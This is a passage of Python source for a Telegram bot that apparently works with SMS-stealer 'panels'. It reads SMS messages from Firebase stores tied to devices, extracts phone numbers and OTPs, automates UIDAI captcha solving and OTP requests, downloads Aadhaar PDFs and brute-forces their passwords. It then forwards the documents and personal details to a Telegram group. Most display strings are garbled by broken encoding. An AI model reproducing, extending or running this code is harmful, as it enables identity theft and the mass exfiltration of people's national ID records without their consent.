        min_timestamp_ms = int((poll_start_time - 15) * 1000)
        otp_found = None
        seen_otps = set(exclude_otps or [])

        while time.time() - poll_start_time < OTP_POLL_TIMEOUT:
            elapsed = int(time.time() - poll_start_time)
            remaining = OTP_POLL_TIMEOUT - elapsed
            otp_found = await asyncio.to_thread(
                firebase_read_otp, device_id, fb_url, fb_key,
                initial_keys, min_timestamp_ms, seen_otps
            )
            if otp_found:
                break
            if elapsed % 10 == 0 and elapsed > 0:
                try:
                    await poll_msg.edit_text(
                        f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢... {remaining}s ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â</b>",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
            await asyncio.sleep(OTP_POLL_INTERVAL)

        if not otp_found:
            try:
                await poll_msg.edit_text(
                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
                    "<blockquote>"
                    "<b>Naya OTP time par nahi aaya.</b>\n"
                    "<b>Agar mobile par OTP aa gaya hai to manually type karo:</b>"
                    "</blockquote>",
                    parse_mode='HTML'
                )
            except Exception:
                pass
            return

        try:
            await poll_msg.edit_text(
                f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â: <code>{otp_found}</code></b>\n"
                f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂÃÂªÃÂ´ÃÂ¢...</b>",
                parse_mode='HTML'
            )
        except Exception:
            pass

        await asyncio.to_thread(firebase_clear_otp, device_id, fb_url, fb_key)

        data = self.get_user_data(uid)
        current_stage = data.get('stage')

        if current_stage == 'otp1':
            await self._uidai_verify_otp1(update, ctx, otp_found)
            data2 = self.get_user_data(uid)
            if data2.get('stage') == 'otp2':
                await asyncio.sleep(2)
                await self._firebase_auto_otp_poll(
                    update, ctx, uid, device_id, 'otp2',
                    firebase_url=fb_url, firebase_key=fb_key,
                    exclude_otps={otp_found}
                )
        elif current_stage == 'otp2':
            await self._uidai_download_pdf(update, ctx, otp_found)

    # ==========================================
    # FIREBASE BATCH AUTO DOWNLOAD
    # ==========================================
    async def _forward_pdf_to_group(self, ctx, pdf_data: bytes, p_name: str,
                                     resp_name: str, eid: str, mobile: str, used_pwd: str,
                                     user_id: int = None):
        target_group = FIREBASE_FORWARD_GROUP_ID or FORWARD_GROUP_ID
        if not target_group:
            return
        if user_id and is_admin(user_id):
            logger.info(f"Admin {user_id} downloaded batch PDF, skipping group forward.")
            return
        caption_fwd = (
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ¤')} {html.escape(resp_name or 'N/A')}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} {eid or 'N/A'}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ±')} {mobile or 'N/A'}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} {used_pwd or 'locked'}</b>"
        )
        for fwd_try in range(4):
            try:
                buf = BytesIO(pdf_data)
                buf.name = p_name
                await ctx.bot.send_document(
                    chat_id=target_group, document=buf,
                    filename=p_name, caption=caption_fwd, parse_mode='HTML',
                    read_timeout=60, write_timeout=60
                )
                logger.info(f"Ã¢ÂÂ Firebase PDF forwarded to group {target_group} successfully.")
                break
            except telegram.error.RetryAfter as ra:
                logger.warning(f"Group forward flood wait: sleeping {ra.retry_after}s")
                await asyncio.sleep(ra.retry_after + 1)
            except Exception as fwd_err:
                if fwd_try < 3:
                    await asyncio.sleep(2 * (fwd_try + 1))
                else:
                    logger.error(f"Group forward error: {fwd_err}")

    async def _notify_admins_new_firebase(self, ctx, user, fb_name: str, fb_url: str):
        user_id = user.id if user else "Unknown"
        uname = f"@{user.username}" if user and user.username else "No Username"
        full_name = user.full_name if user else "Unknown"
        time_str = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")

        admin_msg = (
            f"<b>{emo('Ã°ÂÂÂ¥')} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
            f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{user_id}</code>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Panel Name:</b> <code>{html.escape(fb_name)}</code>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Firebase URL:</b>\n<code>{html.escape(fb_url)}</code>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Time:</b> <code>{time_str}</code>"
            "</blockquote>"
        )

        target_group = FIREBASE_NOTIFY_GROUP_ID
        if target_group:
            try:
                await ctx.bot.send_message(
                    chat_id=target_group,
                    text=admin_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.warning(f"Failed to send new firebase notification to group {target_group}: {e}")
        else:
            for admin_id in ADMIN_IDS:
                try:
                    await ctx.bot.send_message(
                        chat_id=admin_id,
                        text=admin_msg,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.warning(f"Failed to send new firebase notification to admin {admin_id}: {e}")

    async def _notify_admins_new_firebases_bulk(self, ctx, user, panels: list[dict]):
        if not panels:
            return
        user_id = user.id if user else "Unknown"
        uname = f"@{user.username}" if user and user.username else "No Username"
        full_name = user.full_name if user else "Unknown"
        time_str = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")

        lines = []
        for i, p in enumerate(panels[:15], 1):
            lines.append(f"<code>[{i:02d}]</code> <b>{html.escape(p['name'])}</b>: <code>{html.escape(p['url'])}</code>")
        if len(panels) > 15:
            lines.append(f"<i>...aur {len(panels) - 15} aur panels</i>")

        admin_msg = (
            f"<b>{emo('Ã°ÂÂÂ¥')} {len(panels)} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´ÂÃªÂÂ± Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â)!</b>\n\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
            f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{user_id}</code>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Total Panels:</b> <code>{len(panels)}</code>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Time:</b> <code>{time_str}</code>"
            "</blockquote>\n\n"
            f"<blockquote>" + "\n".join(lines) + "</blockquote>"
        )

        target_group = FIREBASE_NOTIFY_GROUP_ID
        if target_group:
            try:
                await ctx.bot.send_message(
                    chat_id=target_group,
                    text=admin_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.warning(f"Failed to send bulk firebase notification to group {target_group}: {e}")
        else:
            for admin_id in ADMIN_IDS:
                try:
                    await ctx.bot.send_message(
                        chat_id=admin_id,
                        text=admin_msg,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.warning(f"Failed to send bulk firebase notification to admin {admin_id}: {e}")


    async def download_device_auto(self, ctx, chat_id, user, dev, fb_url, fb_key="",
                                    status_updater=None, check_cancelled=None,
                                    device_otps: set = None):
        device_id = dev.get('device_id')
        mobile = dev.get('mobile')
        dev_name = dev.get('name') or dev.get('model') or device_id

        if not mobile:
            try:
                params = {"orderBy": '"$key"', "limitToLast": "150"}
                if fb_key:
                    params["auth"] = fb_key
                msgs = await asyncio.to_thread(
                    lambda: _FB_SESSION.get(
                        f"{fb_url.rstrip('/')}/messages/{device_id}.json",
                        params=params, timeout=8
                    ).json()
                )
                if isinstance(msgs, dict):
                    for _, m in sorted(msgs.items(), reverse=True):
                        if not isinstance(m, dict):
                            continue
                        # Direct phone field first
                        ph = clean_indian_mobile(m.get('phoneNumber') or m.get('mobile') or m.get('number'))
                        if ph:
                            mobile = ph
                            break
                        # SMS body se extract Ã¢ÂÂ GOD X panel yh() same logic
                        body = str(m.get('message') or m.get('body') or m.get('text') or '')
                        num = _extract_phone_from_sms(body)
                        if num:
                            mobile = num
                            break
            except Exception as e:
                logger.warning(f"Error checking mobile for device {device_id}: {e}")

        if not mobile or not (str(mobile).isdigit() and len(str(mobile)) == 10):
            return False, "SIM/Mobile number not detected", None

        if check_cancelled and check_cancelled():
            return False, "Cancelled", None

        initial_device_keys = await asyncio.to_thread(firebase_get_message_keys, device_id, fb_url, fb_key)
        poll_min_ts = int((time.time() - 20) * 1000)

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Requesting EID OTP...")

        otp1_txn = cap1_txn = cap1_val = None
        last_err = "Unknown"

        device_otps = device_otps if device_otps is not None else set()

        for attempt in range(1, 11):
            if check_cancelled and check_cancelled():
                return False, "Cancelled", None
            try:
                if status_updater and attempt > 1:
                    await status_updater(f"Ã¢ÂÂ³ Captcha retry ({attempt}/10)...")
                cap = await self.uidai_post(
                    f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data={"captchaLength": "6", "captchaType": "2", "audioCaptchaRequired": False},
                    timeout=6,
                )
                img_b64 = cap.get("imageBase64")
                txn_id = cap.get("transactionId")
                if not img_b64 or not txn_id:
                    continue
                img_bytes = base64.b64decode(img_b64)
                solved = await asyncio.to_thread(solve_captcha_auto, img_bytes)
                if not solved or len(solved) != 6:
                    continue
                payload = {
                    "mobileNumber": mobile, "dob": None, "email": None,
                    "name": "Mr" if attempt <= 6 else "A",
                    "option": "EID", "otp": None, "otpTxnId": None,
                    "captchaTxnId": txn_id, "captcha": solved, "resendOtp": False,
                }
                resp = await self.uidai_post(
                    f"{UIDAI_BASE}/retrieveEidUid/ext/v1/generic/retrieveuideid",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload, timeout=12,
                )
                rd = resp.get("responseData", {})
                if rd.get("otpSent") and rd.get("otpTxnId"):
                    otp1_txn = rd["otpTxnId"]
                    cap1_txn = txn_id
                    cap1_val = solved
                    poll_min_ts = int((time.time() - 5) * 1000)
                    break
                last_err = rd.get("message") or (resp.get("errorDetails") or {}).get("messageEnglish") or "Unknown"
                if is_not_linked_error(last_err) or is_soft_not_found_error(last_err):
                    logger.info(f"[AutoBatch {mobile}] Direct not found ({last_err}), bailing immediately without retries.")
                    return False, "No Records Found", None
                logger.info(f"[AutoBatch {mobile}] EID OTP attempt {attempt}/10: {last_err}")
                if "technical difficulties" in str(last_err).lower():
                    if status_updater and attempt > 1:
                        await status_updater(f"Ã¢ÂÂ³ UIDAI busy, retrying ({attempt}/10)...")
                    await asyncio.sleep(1.0)
                else:
                    await asyncio.sleep(0.3)
            except Exception as e:
                last_err = str(e)
                await asyncio.sleep(0.5)

        if not otp1_txn:
            if "technical difficulties" in str(last_err).lower():
                return False, "UIDAI Server Glitch / Multiple Aadhaar on SIM", None
            if is_soft_not_found_error(last_err):
                return False, "No Aadhaar Record Found", None
            return False, f"EID OTP generation failed ({last_err})", None

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Waiting for EID OTP SMS...")

        poll_start1 = time.time()
        otp1 = None
        max_poll1 = 28
        while time.time() - poll_start1 < max_poll1:
            if check_cancelled and check_cancelled():
                return False, "Cancelled", None
            elapsed = int(time.time() - poll_start1)
            if status_updater and elapsed > 0 and elapsed % 2 == 0:
                await status_updater(f"Ã¢ÂÂ³ Waiting for EID OTP ({elapsed}s/{max_poll1}s)...")
            otp1 = await asyncio.to_thread(
                firebase_read_otp, device_id, fb_url, fb_key,
                initial_device_keys, poll_min_ts, set(device_otps),
                mobile  # Ã¢ÂÂ mobile_hint: dual SIM ke liye correct OTP match
            )
            if otp1:
                break
            await asyncio.sleep(0.5)

        if not otp1:
            return False, "EID OTP timeout (No SMS arrived)", None

        device_otps.add(otp1)
        await asyncio.to_thread(firebase_clear_otp, device_id, fb_url, fb_key)

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Verifying EID OTP...")

        payload1_verify = {
            "mobileNumber": mobile, "dob": None, "email": None, "name": "Mr",
            "option": "EID", "otp": otp1, "otpTxnId": otp1_txn,
            "captchaTxnId": cap1_txn, "captcha": cap1_val, "resendOtp": False,
        }
        resp1_ver = None
        for attempt in range(1, 3):
            try:
                resp1_ver = await self.uidai_post(
                    f"{UIDAI_BASE}/retrieveEidUid/ext/v1/generic/retrieveuideid",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload1_verify, timeout=15,
                )
                if resp1_ver and resp1_ver.get("responseData", {}).get("eidNumber"):
                    break
            except Exception as e:
                logger.warning(f"[AutoBatch {mobile}] OTP1 verify failed: {e}")

        if not resp1_ver:
            return False, "OTP 1 verification network timeout", None

        rd1 = resp1_ver.get("responseData", {})
        eid = rd1.get("eidNumber")
        if not eid:
            err_m = rd1.get("message") or (resp1_ver.get("errorDetails") or {}).get("messageEnglish") or "Invalid OTP"
            return False, f"EID verification failed ({err_m})", None

        resp_name = rd1.get("name") or "Mr"
        resp_dob = rd1.get("dob") or rd1.get("dateOfBirth") or ""

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Requesting Download OTP...")

        # OTP 2 ke liye taaza snapshot lo taaki OTP1 ya puraane SMS exclude ho sakein
        initial_device_keys2 = await asyncio.to_thread(firebase_get_message_keys, device_id, fb_url, fb_key)
        poll_min_ts2 = int((time.time() - 3) * 1000)

        otp2_txn = None
        last_err2 = "Unknown"

        for attempt in range(1, 11):
            if check_cancelled and check_cancelled():
                return False, "Cancelled", None
            try:
                if status_updater and attempt > 1:
                    await status_updater(f"Ã¢ÂÂ³ Captcha retry ({attempt}/10)...")
                cap2 = await self.uidai_post(
                    f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data={"captchaLength": "6", "captchaType": "2", "audioCaptchaRequired": False},
                    timeout=6,
                )
                img_b64_2 = cap2.get("imageBase64")
                cap_txn_2 = cap2.get("transactionId")
                if not img_b64_2 or not cap_txn_2:
                    continue
                img_bytes_2 = base64.b64decode(img_b64_2)
                solved2 = await asyncio.to_thread(solve_captcha_auto, img_bytes_2)
                if not solved2 or len(solved2) != 6:
                    continue
                req_txn = f"MYAADHAAR:{uuid.uuid4()}"
                payload2 = {
                    "captchaValue": solved2, "captchaTxnId": cap_txn_2,
                    "transactionId": req_txn, "eidNumber": eid, "idType": "eid",
                }
                resp2 = await self.uidai_post(
                    f"{UIDAI_BASE}/unifiedAppAuthService/api/v2/generate/aadhaar/otp",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload2, timeout=12,
                )
                if resp2.get("status") == "Success":
                    otp2_txn = resp2.get("txnId")
                    poll_min_ts2 = int((time.time() - 5) * 1000)
                    break
                last_err2 = resp2.get("message") or str(resp2)
                last_err2_lower = str(last_err2).lower()
                if "deceased" in last_err2_lower or "deactivated" in last_err2_lower:
                    return False, "Aadhaar deactivated / deceased", None
                if "pending for dispatch" in last_err2_lower or "has been generated" in last_err2_lower:
                    logger.info(f"[AutoBatch {mobile}] Aadhaar generated but pending dispatch/sync, bailing immediately.")
                    return False, "Aadhaar Generated (Pending Dispatch / Server Sync)", None
                if "rejected" in last_err2_lower:
                    logger.info(f"[AutoBatch {mobile}] Aadhaar enrolment rejected by UIDAI, bailing immediately.")
                    return False, "Enrolment Rejected by UIDAI", None
                logger.info(f"[AutoBatch {mobile}] Download OTP attempt {attempt}/10: {last_err2}")
            except Exception as e:
                last_err2 = str(e)
            await asyncio.sleep(0.3)

        if not otp2_txn:
            return False, f"Download OTP generation failed ({last_err2})", None

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Waiting for Download OTP SMS...")

        poll_start2 = time.time()
        otp2 = None
        max_poll2 = 28
        while time.time() - poll_start2 < max_poll2:
            if check_cancelled and check_cancelled():
                return False, "Cancelled", None
            elapsed = int(time.time() - poll_start2)
            if status_updater and elapsed > 0 and elapsed % 2 == 0:
                await status_updater(f"Ã¢ÂÂ³ Waiting for Download OTP ({elapsed}s/{max_poll2}s)...")
            otp2 = await asyncio.to_thread(
                firebase_read_otp, device_id, fb_url, fb_key,
                initial_device_keys2, poll_min_ts2, set(device_otps),
                mobile  # Ã¢ÂÂ mobile_hint: dual SIM ke liye correct OTP match
            )
            if otp2:
                break
            await asyncio.sleep(0.5)

        if not otp2:
            return False, "Download OTP timeout (No SMS arrived)", None

        device_otps.add(otp2)

        await asyncio.to_thread(firebase_clear_otp, device_id, fb_url, fb_key)

        if status_updater:
            await status_updater("Ã¢ÂÂ³ Downloading Aadhaar PDF...")

        payload_dl = {"eid": eid, "mask": False, "otp": otp2, "otpTxnId": otp2_txn}

        raw_pdf_bytes = None
        def _req_download_sync():
            headers = _uidai_h("MYAADHAARREVAMP")
            curl_opts = {
                CurlOpt.CONNECTTIMEOUT: 10,
                CurlOpt.BUFFERSIZE: 524288,
                CurlOpt.TCP_NODELAY: 1,
            }
            resp = curl_requests.post(
                f"{UIDAI_BASE}/downloadAadhaarService/api/aadhaar/download",
                headers=headers, json=payload_dl,
                verify=False, curl_options=curl_opts, timeout=25,
            )
            if resp.status_code == 200 and resp.content:
                if resp.content[:2] == b"PK" or resp.content[:4] == b"%PDF":
                    return resp.content
                if resp.content.startswith(b"{"):
                    try:
                        j_check = json.loads(resp.content.decode("utf-8", errors="ignore"))
                        if find_pdf(j_check):
                            return resp.content
                        err_c = j_check.get("errorCode", "")
                        if err_c in ("DEA_VAL_OTP_INF_002", "DEA_NET_OTP_ERR_001"):
                            return resp.content
                        err_msg = str((j_check.get("errorDetails") or {}).get("messageEnglish") or j_check.get("message") or "").lower()
                        if err_c == "DEA_NET_SSA_ERR_101" or "busy" in err_msg:
                            logger.warning(f"[Batch Download {mobile}] hit UIDAI technical glitch: {err_c or err_msg[:50]}.")
                            return resp.content
                        else:
                            return resp.content
                    except Exception:
                        pass
                return resp.content
            raise Exception(f"HTTP {resp.status_code}: {resp.text[:100]}")

        try:
            raw_pdf_bytes = await asyncio.to_thread(_req_download_sync)
        except Exception as e:
            err_str = str(e).lower()
            if "technical difficulties" in err_str:
                return False, "UIDAI Server Glitch (Temporary technical difficulties)", None
            return False, f"PDF download request failed: {e}", None

        if not raw_pdf_bytes:
            return False, "Empty PDF response from UIDAI", None

        extracted = extract_pdf(raw_pdf_bytes)
        if isinstance(extracted, dict):
            err_code = extracted.get("errorCode", "")
            err_d = extracted.get("message") or (extracted.get("errorDetails") or {}).get("messageEnglish") or extracted.get("statusMessage") or "Invalid OTP / Expired"
            if err_code in ("DEA_VAL_OTP_INF_002", "DEA_NET_OTP_ERR_001"):
                return False, "OTP Invalid / Expired (UIDAI rejected)", None
            if "technical difficulties" in str(err_d).lower() or err_code == "DEA_NET_SSA_ERR_101":
                return False, "UIDAI Server Glitch (Temporary technical difficulties)", None
            return False, f"UIDAI rejected OTP: {err_d}", None

        if not extracted or len(extracted) < 500:
            return False, "Corrupt or unreadable PDF data", None

        if status_updater:
            await status_updater("Ã°ÂÂÂ Unlocking PDF password...")

        unlocked, used_pwd = await asyncio.to_thread(unlock_pdf_bruteforce, extracted, resp_name, resp_dob)
        final_pdf = unlocked if unlocked else extracted

        safe_name = "".join(c for c in (resp_name or "Unknown") if c.isalnum())
        pdf_filename = f"@Getaadharpdfbot_{safe_name}_{mobile[-4:]}_Aadhaar.pdf"
        prefix = resp_name.replace(" ", "")[:4].upper() if resp_name else "NAME"
        status_text = "Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!" if unlocked else "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Password Protected)"
        pwd_text = f"<code>{used_pwd}</code>" if used_pwd else f"<code>{prefix}YYYY</code>"

        caption = (
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° {status_text}</b>\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(resp_name or 'N/A')}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: <code>{eid}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: <code>{mobile}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´Â: {pwd_text}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â: {html.escape(str(dev_name))}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â: {pdf_filename}</b>\n"
            "</blockquote>\n\n"
            f"<b>{emo('Ã°ÂÂÂ¨')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â!</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )

        sent_doc = None
        for send_try in range(3):
            try:
                buf = BytesIO(final_pdf)
                buf.name = pdf_filename
                sent_doc = await ctx.bot.send_document(
                    chat_id=chat_id, document=buf, filename=pdf_filename,
                    caption=caption, parse_mode='HTML',
                    read_timeout=60, write_timeout=60, connect_timeout=30
                )
                if sent_doc:
                    try:
                        await ctx.bot.pin_chat_message(
                            chat_id=chat_id, message_id=sent_doc.message_id,
                            disable_notification=True
                        )
                    except Exception as pe:
                        logger.warning(f"Could not pin batch doc: {pe}")
                break
            except telegram.error.RetryAfter as ra:
                logger.warning(f"User PDF send flood wait: sleeping {ra.retry_after}s")
                await asyncio.sleep(ra.retry_after + 1)
            except Exception as se:
                if send_try < 2:
                    await asyncio.sleep(2)
                else:
                    logger.error(f"Failed to send PDF to user chat {chat_id}: {se}")

        if not is_admin(user.id):
            asyncio.create_task(self._forward_pdf_to_group(ctx, final_pdf, pdf_filename, resp_name, eid, mobile, used_pwd, user_id=user.id))
        else:
            logger.info(f"Admin {user.id} downloaded batch PDF, skipping group forward.")

        def _db_log_batch():
            try:
                update_user_stats(user.id)
                log_download(user.id, user.username or 'Unknown', mobile, resp_name, eid, pdf_filename, forwarded=0 if is_admin(user.id) else 1)
            except Exception as le:
                logger.error(f"Failed to log download: {le}")

        asyncio.create_task(asyncio.to_thread(_db_log_batch))

        return True, "Success", {
            'name': resp_name, 'eid': eid, 'mobile': mobile,
            'pwd': used_pwd, 'filename': pdf_filename,
        }

    async def run_batch_download(self, ctx, chat_id, user, devices, panel_name="All Panels"):
        uid = user.id
        if self.active_batches.get(uid):
            await ctx.bot.send_message(
                chat_id=chat_id,
                text="Ã¢ÂÂ Ã¯Â¸Â <b>Ek batch download already chal raha hai! Stop karne ke liye /cancel bhejein.</b>",
                parse_mode='HTML'
            )
            return

        # Ã¢ÂÂÃ¢ÂÂ Dual SIM expand: agar 1 device me 2 numbers hain to dono ka download hoga Ã¢ÂÂÃ¢ÂÂ
        expanded = []
        for d in devices:
            mobs = d.get('mobiles') or ([d['mobile']] if d.get('mobile') else [])
            if len(mobs) >= 2:
                for i, mob in enumerate(mobs[:2]):
                    entry = dict(d)
                    entry['mobile'] = mob
                    entry['mobiles'] = [mob]
                    entry['_sim_label'] = f"SIM{i+1}"
                    expanded.append(entry)
            else:
                entry = dict(d)
                entry['_sim_label'] = ""
                expanded.append(entry)

        valid_devices = [d for d in expanded if d.get('status', True) and d.get('mobile')]
        if not valid_devices:
            await ctx.bot.send_message(
                chat_id=chat_id,
                text=f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃÂÃÂª Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â</b>\n\n<blockquote>[{panel_name}] me koi device online nahi hai ya unka SIM number detect nahi hua.</blockquote>",
                parse_mode='HTML'
            )
            return

        self.active_batches[uid] = {'cancel': False, 'total': len(valid_devices)}

        dev_statuses = {}
        for d in valid_devices:
            did = d['device_id']
            mob = d.get('mobile') or 'Searching...'
            dname = d.get('name') or d.get('model') or did
            sim_lbl = d.get('_sim_label', '')
            status_key = f"{did}_{sim_lbl}" if sim_lbl else did
            dev_statuses[status_key] = {
                'mobile': mob,
                'sim_label': sim_lbl,
                'name': dname[:12],
                'status': 'Ã¢ÂÂ³ In Queue', 'done': False, 'success': False, 'meta': None,
            }

        is_rich_mode = False
        dash_msg_id = None
        init_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ", callback_data=f"cancel_batch_{uid}", style="danger")]
        ])

        init_blocks = build_batch_rich_blocks(panel_name, dev_statuses, 0, len(dev_statuses), 0, 0)
        send_payload = {
            "chat_id": chat_id,
            "rich_message": {"blocks": init_blocks},
            "reply_markup": init_kb.to_dict()
        }

        for _t in range(3):
            try:
                res = await ctx.bot.do_api_request("sendRichMessage", api_kwargs=send_payload)
                if isinstance(res, dict) and "message_id" in res:
                    dash_msg_id = res["message_id"]
                elif hasattr(res, "message_id"):
                    dash_msg_id = res.message_id
                if dash_msg_id:
                    is_rich_mode = True
                    break
            except Exception as d_err:
                logger.warning(f"Failed to send initial batch rich dashboard (attempt {_t+1}/3): {d_err}")
                await asyncio.sleep(1.5)

        if not dash_msg_id:
            for _t in range(3):
                try:
                    init_html = build_batch_html_text(panel_name, dev_statuses, 0, len(dev_statuses), 0, 0)
                    fallback_msg = await ctx.bot.send_message(
                        chat_id=chat_id,
                        text=init_html,
                        reply_markup=init_kb,
                        parse_mode='HTML'
                    )
                    dash_msg_id = fallback_msg.message_id
                    break
                except Exception as fb_err:
                    logger.warning(f"Failed to send initial fallback batch dashboard: {fb_err}")
                    await asyncio.sleep(1.5)

        if not dash_msg_id:
            logger.error(f"Could not send batch dashboard message to chat {chat_id}, aborting batch.")
            self.active_batches.pop(uid, None)
            return

        dashboard_dirty = asyncio.Event()
        dashboard_dirty.set()
        dashboard_running = True

        async def dashboard_updater():
            last_render_key = (0, 0, 0, tuple((k, s['status']) for k, s in list(dev_statuses.items())[:20]))
            while dashboard_running:
                try:
                    await asyncio.wait_for(dashboard_dirty.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    pass
                dashboard_dirty.clear()

                success_c = sum(1 for s in dev_statuses.values() if s['success'])
                done_c = sum(1 for s in dev_statuses.values() if s['done'])
                fail_c = done_c - success_c
                total_c = len(dev_statuses)

                render_key = (done_c, success_c, fail_c, tuple((k, s['status']) for k, s in list(dev_statuses.items())[:20]))

                if render_key != last_render_key:
                    is_finished = (done_c >= total_c) or self.active_batches.get(uid, {}).get('cancel', False)
                    kb = None if is_finished else InlineKeyboardMarkup([
                        [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ", callback_data=f"cancel_batch_{uid}", style="danger")]
                    ])

